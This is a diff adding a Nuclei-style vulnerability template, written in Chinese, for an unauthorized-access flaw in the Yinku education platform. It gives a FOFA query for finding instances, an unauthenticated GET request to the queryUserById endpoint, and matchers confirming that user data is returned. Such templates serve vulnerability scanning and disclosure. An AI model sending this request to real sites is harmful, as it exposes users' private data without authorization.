@@ -1,0 +1,28 @@
+id: yinku-edu-queryuserbyid-unauthorized
+
+info:
+  name: "因酷教育平台 queryUserById 接口未授权访问漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/image/keupload?" && body="uploadSimpleUrl"
+      该漏洞源于系统未对 queryUserById 接口实施有效的访问控制策略，攻击者可通过构造特定请求参数绕过身份验证机制，直接获取敏感用户数据。此缺陷可能导致用户隐私信息泄露，威胁系统数据安全性。
+  tags: 因酷教育平台
+
+http:
+  - raw:
+    - |
+      GET /webapp/queryUserById?id=7 HTTP/1.1
+      Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+      - '"success":true'
+      - '"message":'
+      - '"entity":{'
+      condition: and
+    - type: status
+      status:
+      - 200
